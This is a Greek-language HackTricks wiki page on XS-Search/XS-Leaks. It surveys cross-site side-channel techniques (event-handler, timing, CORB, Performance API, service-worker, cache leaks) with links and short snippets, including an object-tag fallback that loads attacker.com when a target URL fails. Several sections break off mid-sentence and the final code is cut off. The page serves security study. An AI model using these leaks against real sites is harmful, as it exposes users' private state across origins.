# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να αυτοματοποιήσετε εργασιακές διαδικασίες με τα πιο προηγμένα εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Εάν θέλετε να δείτε την εταιρεία σας να διαφημίζεται στο HackTricks ή να κατεβάσετε το HackTricks σε μορφή PDF, ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Βασικές Πληροφορίες

Το XS-Search είναι μια μέθοδος που χρησιμοποιείται για την **εξαγωγή πληροφοριών διασυνοριακά** εκμεταλλευόμενο ευπάθειες στο πλευρικό κανάλι.

Οι βασικοί συνιστώσες που συμμετέχουν σε αυτήν την επίθεση περιλαμβάνουν:

* **Ευπάθεια Ιστοσελίδας**: Η ιστοσελίδα-στόχος από την οποία προορίζεται να εξαχθούν πληροφορίες.
* **Ιστοσελίδα Επιτιθέμενου**: Η κακόβουλη ιστοσελίδα που δημιουργείται από τον επιτιθέμενο, την οποία επισκέπτεται ο θύμα και φιλοξενεί την εκμετάλλευση.
* **Μέθοδος Ενσωμάτωσης**: Η τεχνική που χρησιμοποιείται για να ενσωματωθεί η Ευπάθεια Ιστοσελίδας στην Ιστοσελίδα Επιτιθέμενου (π.χ. window.open, iframe, fetch, ετικέτα HTML με href κ.λπ.).
* **Τεχνική Διαρροής**: Τεχνικές που χρησιμοποιούνται για να διακρίνουν τις διαφορές στην κατάσταση της Ευπάθειας Ιστοσελίδας με βάση τις πληροφορίες που συλλέγονται μέσω της μεθόδου ενσωμάτωσης.
* **Καταστάσεις**: Οι δύο δυνητικές καταστάσεις της Ευπάθειας Ιστοσελίδας, που ο επιτιθέμενος στοχεύει να διακρίνει.
* **Ανιχνεύσιμες Διαφορές**: Παρατηρήσιμες διακυμάνσεις στις οποίες βασίζεται ο επιτιθέμενος για να συμπεράνει την κατάσταση της Ευπάθειας Ιστοσελίδας.

### Ανιχνεύσιμες Διαφορές

Μπορούν να αναλυθούν αρκετά στοιχεία για να διακρίνουν τις καταστάσεις της Ευπάθειας Ιστοσελίδας:

* **Κωδικός Κατάστασης**: Διάκριση μεταξύ **διάφορων κωδικών κατάστασης απόκρισης HTTP** διασυνοριακά, όπως σφάλματα εξυπηρετητή, σφάλματα πελάτη ή σφάλματα πιστοποίησης.
* **Χρήση ΠΕΑΣ**: Αναγνώριση **χρήσης των Web APIs** σε σελίδες, αποκαλύπτοντας εάν μια σελίδα διασυνοριακά χρησιμοποιεί ένα συγκεκριμένο JavaScript Web API.
* **Ανακατευθύνσεις**: Ανίχνευση πλοήγησης σε διάφορες σελίδες, όχι
## **Τεχνικές βασισμένες στον χρόνο**

Ορισμένες από τις παρακάτω τεχνικές χρησιμοποιούν τον χρόνο ως μέρος της διαδικασίας για την ανίχνευση διαφορών στις πιθανές καταστάσεις των ιστοσελίδων. Υπάρχουν διάφοροι τρόποι για τη μέτρηση του χρόνου σε έναν περιηγητή ιστού.

**Ρολόγια**: Το API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) επιτρέπει στους προγραμματιστές να λαμβάνουν μετρήσεις υψηλής ανάλυσης του χρόνου.\
Υπάρχουν αρκετά API που οι επιτιθέμενοι μπορούν να καταχραστούν για να δημιουργήσουν ασαφή ρολόγια: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animations και άλλα.\
Για περισσότερες πληροφορίες: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Τεχνικές Χειριστή Συμβάντων

### Onload/Onerror

* **Μέθοδοι Ενσωμάτωσης**: Πλαίσια, Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες πληροφορίες**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Περίληψη**: Εάν προσπαθείτε να φορτώσετε ένα πόρο και τα συμβάντα onerror/onload ενεργοποιούνται όταν ο πόρος φορτώνεται με επιτυχία/αποτυχία, είναι δυνατό να ανιχνευθεί ο κωδικός κατάστασης.
* **Παράδειγμα κώδικα**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Το παράδειγμα κώδικα προσπαθεί να φορτώσει **αντικείμενα σεναρίων από τον JS**, αλλά μπορούν να χρησιμοποιηθούν επίσης και **άλλες ετικέτες** όπως αντικείμενα, φύλλα στυλ, εικόνες, ήχους. Επιπλέον, είναι επίσης δυνατό να ενσωματώσετε απευθείας την ετικέτα και να δηλώσετε τα συμβάντα `onload` και `onerror` μέσα στην ετικέτα (αντί να την ενσωματώσετε από τον JS).

Υπάρχει επίσης μια έκδοση αυτής της επίθεσης χωρίς κώδικα σε σενάριο:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
Σε αυτήν την περίπτωση, εάν το `example.com/404` δεν βρεθεί, θα φορτωθεί το `attacker.com/?error`.

### Onload Timing

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Χρονομέτρηση (συνήθως λόγω περιεχομένου σελίδας, κωδικού κατάστασης)
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Περίληψη:** Το [**API performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο απαιτείται για να πραγματοποιηθεί μια αίτηση. Ωστόσο, μπορούν να χρησιμοποιηθούν και άλλα ρολόγια, όπως το [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) που μπορεί να ανιχνεύσει εργασίες που εκτελούνται για περισσότερο από 50ms.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) ένα άλλο παράδειγμα στο:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

Αυτή η τεχνική είναι παρόμοια με την προηγούμενη, αλλά ο **επιτιθέμενος** θα επιβάλει επίσης μια ενέργεια που θα απαιτήσει **σημαντικό χρόνο** όταν η **απάντηση είναι θετική ή αρνητική** και θα μετρήσει αυτόν τον χρόνο.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Μέθοδοι Ενσωμάτωσης**: Πλαίσια (Frames)
* **Ανιχνεύσιμη Διαφορά**: Χρονομέτρηση (συνήθως λόγω περιεχομένου σελίδας, κωδικού κατάστασης)
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Περίληψη:** Το [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο απαιτείται για να πραγματοποιηθεί μια αίτηση. Μπορούν να χρησιμοποιηθούν και άλλα ρολόγια.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Ο χρόνος που απαιτείται για τη λήψη ενός πόρου μπορεί να μετρηθεί χρησιμοποιώντας τα γεγονότα [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) και [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event). Το γεγονός **`beforeunload`** εκτελείται όταν ο περιηγητής είναι έτοιμος να μεταβεί σε μια νέα σελίδα, ενώ το γεγονός **`unload`** συμβαίνει όταν πραγματοποιείται πραγματικά η μετάβαση. Ο χρονικός διάστημας μεταξύ αυτών των δύο γεγονότων μπορεί να υπολογιστεί για να προσδιοριστεί η διάρκεια που ο περιηγητής ξόδεψε για τη λήψη του πόρου.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Μέθοδοι Ενσωμάτωσης**: Πλαίσια (Frames)
* **Ανιχνεύσιμη Διαφορά**: Χρονομέτρηση (συνήθως λόγω περιεχομένου σελίδας, κωδικού κατάστασης)
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Περίληψη:** Το [API performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο απαιτείται για να πραγματοποιηθεί μια αίτηση. Μπορούν να χρησιμοποιηθούν και άλλα ρολόγια.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Έχει παρατηρηθεί ότι στην απουσία [προστασίας πλαισίων](https://xsleaks.dev/docs/defenses/opt-in/xfo/), ο χρόνος που απαιτείται για τη φόρτωση μιας σελίδας και των υποπόρων της μέσω του δικτύου μπορεί να μετρηθεί από έναν επιτιθέμενο. Αυτή η μέτρηση είναι συνήθως δυνατή επειδή ο χειριστής `onload` ενός iframe ενεργοποιείται μόνο μετά την ολοκλήρωση της φόρτωσης των πόρων και της εκτέλεσης του JavaScript. Για να παρακάμψει την μεταβλητότητα που εισάγεται από την εκτέλεση του script, ένας επιτιθέμενος μπορεί να χρησιμοποιήσει το χαρακτηριστικό [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) μέσα στο `<iframe>`. Η περιορισμένη λειτουργικότητα που παρέχει αυτό το χαρακτηριστικό, ειδικά η μη εκτέλεση του JavaScript, διευκολύνει μια μέτρηση που επηρεάζεται κυρίως από την απόδοση του δικτύου.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + σφάλμα + onload

* **Μέθοδοι Ενσωμάτωσης**: Πλαίσια
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες πληροφορίες**:
* **Περίληψη**: Εάν μπορείτε να προκαλέσετε σφάλμα στη σελίδα όταν προσπελαύνεται το σωστό περιεχόμενο και να τη φορτώσετε σωστά όταν προσπελαύνεται οποιοδήποτε περιεχόμενο, τότε μπορείτε να δημιουργήσετε έναν βρόχο για να εξάγετε όλες τις πληροφορίες χωρίς να μετράτε τον χρόνο.
* **Παράδειγμα Κώδικα**:

Υποθέστε ότι μπορείτε να **εισάγετε** τη **σελίδα** που έχει το **μυστικό** περιεχόμενο **μέσα σε ένα Iframe**.

Μπορείτε να **κάνετε το θύμα να αναζητήσει** το αρχείο που περιέχει "_**flag**_" χρησιμοποιώντας ένα **Iframe** (εκμεταλλευόμενος το CSRF για παράδειγμα). Μέσα στο Iframe γνωρίζετε ότι το _**onload event**_ θα εκτελεστεί **πάντα τουλάχιστον μία φορά**. Στη συνέχεια, μπορείτε να **αλλάξετε** το **URL** του **iframe** αλλάζοντας μόνο το **περιεχόμενο** του **hash** μέσα στο URL.

Για παράδειγμα:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Εάν το πρώτο URL φορτώθηκε **με επιτυχία**, τότε, όταν **αλλάξετε** το **μέρος hash** του URL το **onload** event **δεν θα ενεργοποιηθεί** ξανά. Αλλά **εάν** η σελίδα είχε κάποιο είδος **σφάλματος** κατά τη φόρτωση, τότε το **onload** event θα ενεργοποιηθεί **ξανά**.

Έτσι, μπορείτε να **διακρίνετε μεταξύ** μιας σελίδας που φορτώθηκε **σωστά** ή σελίδας που έχει ένα **σφάλμα** όταν προσπελαύνεται.

### Εκτέλεση Javascript

* **Μέθοδοι Ενσωμάτωσης**: Πλαίσια
* **Ανιχνεύσιμη Διαφορά**: Περιεχόμενο Σελίδας
* **Περισσότερες πληροφορίες**:
* **Περίληψη**: Εάν η **σελίδα** επιστρέφει το **ευαίσθητο** περιεχόμενο, **ή** ένα **περιεχόμενο** που μπορεί να **ελεγχθεί** από τον χρήστη. Ο χρήστης μπορεί να ορίσει **έγκυρο κώδικα JS στην αρνητική περίπτωση**, και να φορτώσει κάθε προσπάθεια μέσα σε **`<script>`** tags, έτσι στις **αρνητικές** περιπτώσεις ο κακόβουλος κώδικας εκτελείται, και στις **θετικές** περιπτώσεις δεν εκτελείται τίποτα.
* **Παράδειγμα Κώδικα**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης & Επικεφαλίδες
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Περίληψη**: Το **Cross-Origin Read Blocking (CORB)** είναι μια μέτρηση ασφαλείας που αποτρέπει τις ιστοσελίδες από το να φορτώνουν ορισμένους ευαίσθητους πόρους από διαφορετική προέλευση για να προστατευτούν από επιθέσεις όπως το **Spectre**. Ωστόσο, οι επιτιθέμενοι μπορούν να εκμεταλλευτούν την προστατευτική συμπεριφορά του. Όταν μια απάντηση που υπόκειται σε **CORB** επιστρέφει ένα _**CORB protected**_ `Content-Type` με `nosniff` και έναν κωδικό κατάστασης `2xx`, το **CORB** αφαιρεί το σώμα και τις επικεφαλίδες της απάντησης. Οι επιτιθέμενοι που παρατηρούν αυτό μπορούν να συμπεράνουν τον συνδυασμό του **κωδικού κατάστασης** (που υποδηλώνει επιτυχία ή σφάλμα) και του `Content-Type` (που υποδηλ
### Πληρωμή API

* **Μέθοδοι Ενσωμάτωσης**: Πλαίσια, Αναδυόμενα παράθυρα
* **Ανιχνεύσιμη Διαφορά**: Χρήση του API
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Περίληψη**: Ανίχνευση αιτήματος πληρωμής επειδή μόνο ένα μπορεί να είναι ενεργό ταυτόχρονα.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Αυτό το XS-Leak επιτρέπει σε έναν επιτιθέμενο να **ανιχνεύσει όταν μια σελίδα από διαφορετική προέλευση ξεκινά ένα αίτημα πληρωμής**.

Επειδή **μόνο ένα αίτημα πληρωμής μπορεί να είναι ενεργό** ταυτόχρονα, αν ο ιστότοπος-στόχος χρησιμοποιεί το Payment Request API, οποιαδήποτε **προσπάθεια να εμφανιστεί ξανά αυτό το API θα αποτύχει** και θα προκαλέσει μια **εξαίρεση JavaScript**. Ο επιτιθέμενος μπορεί να εκμεταλλευτεί αυτό προσπαθώντας **περιοδικά να εμφανίσει το UI του Payment API**. Αν μια προσπάθεια προκαλέσει μια εξαίρεση, αυτό σημαίνει ότι ο ιστότοπος-στόχος το χρησιμοποιεί αυτή τη στιγμή. Ο επιτιθέμενος μπορεί να κρύψει αυτές τις περιοδικές προσπάθειες κλείνοντας αμέσως το UI μετά τη δημιουργία του.

### Χρονομέτρηση του Βρόχου Συμβάντων <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Μέθοδοι Ενσωμάτωσης**:
* **Ανιχνεύσιμη Διαφορά**: Χρονομέτρηση (συνήθως λόγω περιεχομένου σελίδας, κωδικού κατάστασης)
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Περίληψη**: Μέτρηση του χρόνου εκτέλεσης μιας ιστοσελίδας κατά την κατάχρηση του μονονηματικού βρόχου συμβάντων της JS.
* **Παράδειγμα Κώδικα**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

Η JavaScript λειτουργεί με βάση έναν [μονονηματικό βρόχο συμβάντων](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), που σημαίνει ότι **μπορεί να εκτελεί μόνο μια εργασία τη φορά**. Αυτή η χαρακτηριστική μπορεί να εκμεταλλευτεί για να μετρηθεί **πόσο χρόνο απαιτεί η εκτέλεση κώδικα από μια διαφορετική προέλευση**. Ένας επιτιθέμενος μπορεί να μετρήσει τον χρόνο εκτέλεσης του δικού του κώδικα στον βρόχο συμβάντων συνεχώς αποστέλλοντας συνεχώς συμβάντα με σταθερές ιδιότητες. Αυτά τα συμβάντα θα επεξεργαστούνται όταν η ουρά συμβάντων είναι άδεια. Αν και άλλες προελεύσεις αποστέλλουν επίσης συμβάντα στην ίδια ουρά, ένας **επιτιθέμενος μπορεί να συμπεράνει τον χρόνο που απαιτείται για την εκτέλεση αυτών των εξωτερικών συμβάντων παρατηρώντας καθυστερήσεις στην εκτέλεση των δικών του εργασιών**. Αυτή η μέθοδος παρακολούθησης του βρόχου συμβάντων για καθυστερήσεις μπορεί να αποκαλύψει τον χρόνο εκτέλεσης κώδικα από διάφορες προελεύσεις, αποκαλύπτοντας πιθανώς ευαίσθητες πληροφορίες.

{% hint style="warning" %}
Κατά τη χρονομέτρηση εκτέλεσης είναι δυνατόν να **εξαλειφθούν** **παράγοντες δικτύου** για να ληφθούν **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιεί η σελίδα πριν τη φόρτωσή τ
## Τεχνικές API Απόδοσης

Το [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) προσφέρει πληροφορίες σχετικά με τις μετρήσεις απόδοσης των web εφαρμογών, εμπλουτισμένες από το [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource_Timing_API). Το Resource Timing API επιτρέπει την παρακολούθηση λεπτομερών χρονομετρήσεων δικτυακών αιτημάτων, όπως η διάρκεια των αιτημάτων. Ειδικότερα, όταν οι εξυπηρετητές περιλαμβάνουν το κεφαλίδα `Timing-Allow-Origin: *` στις απαντήσεις τους, γίνονται διαθέσιμα επιπλέον δεδομένα, όπως το μέγεθος μεταφοράς και ο χρόνος αναζήτησης του τομέα.

Αυτή η πληθώρα δεδομένων μπορεί να ανακτηθεί μέσω μεθόδων όπως η [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ή η [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), παρέχοντας μια συνολική εικόνα των πληροφοριών που σχετίζονται με την απόδοση. Επιπλέον, το API διευκολύνει τη μέτρηση των χρόνων εκτέλεσης υπολογίζοντας τη διαφορά μεταξύ των χρονοσημάτων που αποκτήθηκαν από το [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Ωστόσο, αξίζει να σημειωθεί ότι για ορισμένες λειτουργίες σε προγράμματα περιήγησης όπως το Chrome, η ακρίβεια του `performance.now()` μπορεί να περιορίζεται σε χιλιοδευτερόλεπτα, πράγμα που μπορεί να επηρεάσει την ακρίβεια των μετρήσεων χρονομέτρησης.

Πέρα από τις μετρήσεις χρονομέτρησης, το Performance API μπορεί να χρησιμοποιηθεί για αναλύσεις που σχετίζονται με την ασφάλεια. Για παράδειγμα, η παρουσία ή η απουσία σελίδων στο αντικείμενο `performance` στο Chrome μπορεί να υποδείξει την εφαρμογή του `X-Frame-Options`. Συγκεκριμένα, αν μια σελίδα αποκλείεται από την απεικόνιση σε ένα πλαίσιο λόγω του `X-Frame-Options`, δεν θα καταγραφεί στο αντικείμενο `performance`, παρέχοντας έναν διακριτικό υπόνοια για τις πολιτικές πλαισίωσης της σελίδας.

### Διαρροή Σφάλματος

* **Μέθοδοι Ενσωμάτωσης**: Πλαίσια, Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Περίληψη:** Ένα αίτημα που οδηγεί σε σφάλμα δεν δημιουργεί μια καταχώρηση χρονομέτρησης πόρου.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Είναι δυνατό να **διαφοροποιηθούν οι κωδικοί κατάστασης απόκρισης HTTP** επειδή τα αιτήματα που οδηγούν σε **σφάλματα** δεν δημιουργούν μια καταχώρηση απόδοσης.

### Σφάλμα Επαναφόρτωσης Στυλ

* **Μέθοδοι Ενσωμάτωσης**: Στοιχεία HTML
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Περίληψη:** Λόγω ενός σφάλματος του προγράμματος περιήγησης, τα αιτήματα που οδηγούν σε σφάλματα φορτώνονται δύο φορές.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Στην προηγούμενη τεχνική εντοπίστηκαν επίσης δύο περιπτώσεις όπου σφάλματα στη συλλογή απορριμμάτων του προγράμματος π
### Έναρξη Διαρροής Ανακατεύθυνσης

* **Μέθοδοι Ενσωμάτωσης**: Πλαίσια
* **Ανιχνεύσιμη Διαφορά**: Ανακατεύθυνση
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Περίληψη:** Η καταγραφή του χρόνου έναρξης μιας ανακατεύθυνσης διαρρέει πληροφορίες.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Βρήκαμε μια περίπτωση XS-Leak που εκμεταλλεύεται τη συμπεριφορά ορισμένων προγραμμάτων περιήγησης που καταγράφουν υπερβολικά πολλές πληροφορίες για αιτήσεις διασυνοριακής προέλευσης. Το πρότυπο καθορίζει ένα υποσύνολο των χαρακτηριστικών που πρέπει να οριστούν σε μηδενική τιμή για πόρους διασυνοριακής προέλευσης. Ωστόσο, στο **SA** είναι δυνατό να ανιχνευθεί αν ο χρήστης ανακατευθύνεται από τη σελίδα-στόχο, ερωτώντας το **Performance API** και ελέγχοντας τα δεδομένα χρονολόγησης **redirectStart**.

### Διάρκεια Διαρροής Ανακατεύθυνσης

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Ανακατεύθυνση
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Περίληψη:** Η διάρκεια των χρονολογιών είναι αρνητική όταν συμβαίνει μια ανακατεύθυνση.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

Στο GC, η **διάρκεια** για αιτήσεις που οδηγούν σε **ανακατεύθυνση** είναι **αρνητική** και μπορεί να **διακριθεί** έτσι από αιτήσεις που δεν οδηγούν σε ανακατεύθυνση.

### Διαρροή CORP

* **Μέθοδοι Ενσωμάτωσης**: Πλαίσια
* **Ανιχνεύσιμη Διαφορά**: Κεφαλίδα
* **Περισσότερες πληροφορίες**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Περίληψη:** Οι πόροι που προστατεύονται με CORP δεν δημιουργούν καταχωρήσεις χρονολόγησης πόρων.
* **Παράδειγμα Κώδικα**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Σε ορισμένες περιπτώσεις, η καταχώρηση **nextHopProtocol** μπορεί να χρησιμοποιηθεί ως τεχνική διαρροής. Στο GC, όταν ορίζεται η κεφαλίδα **CORP**, το nextHopProtocol θα είναι **άδειο**. Σημειώστε ότι το SA δεν θα δημιουργήσει καθόλου μια καταχώρηση απόδοσης για πόρους που υποστηρίζουν το CORP.

### Service Worker

* **Μέθοδοι Ενσωμάτωσης**: Πλαίσια
* **Ανιχνεύσιμη Διαφορά**: Χρήση API
* **Περισσότερες πληροφορίες**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Περίληψη:** Ανιχνεύστε αν ένας service worker είναι εγγεγραμμένος για ένα συγκεκριμένο προέλευση.
* **Παράδειγμα Κώδικα**:

Οι service workers είναι περιβάλλοντα εκτέλεσης σε σενάρια που λειτουργούν σε μια προέλευση. Τρέχουν στο παρασκήνιο μιας ιστοσελίδας και μπορούν να παρεμβάλλονται, να τροποποιούν και να **αποθηκεύουν πόρους** για τη δημιουργία εφαρμογών ιστού εκτός σύνδεσης.\
Εάν ένας **πόρος που έχει αποθηκευτεί** από έναν **service worker** προσπελαστεί μέσω **iframe**, ο πόρος θα φορτωθεί από την αποθήκη του service worker.\
Για να ανιχνευθεί αν ο πόρος φορτώθηκε από την αποθήκη του service worker, μπορεί να χρησιμοποιηθεί το **Performance API**.\
Αυτό μπορεί επίσης να γίνει με μια επίθεση Timing (ελέγξτε το έγγραφο για περισσότερες πληροφορίες).

### Προσωρινή Αποθήκευση

* **Μέθοδοι Ενσωμάτωσης**: Fetch API
* **Ανιχνεύσιμη Διαφορά**: Χρονολόγηση
* **Περισσότερες πληροφορίες**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Περίληψη:** Είναι δυνατόν να ελεγχθεί αν ένας πόρος έχει αποθηκευτεί στην προσωρινή μνήμη.
* **Παράδειγμα Κώδικα**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
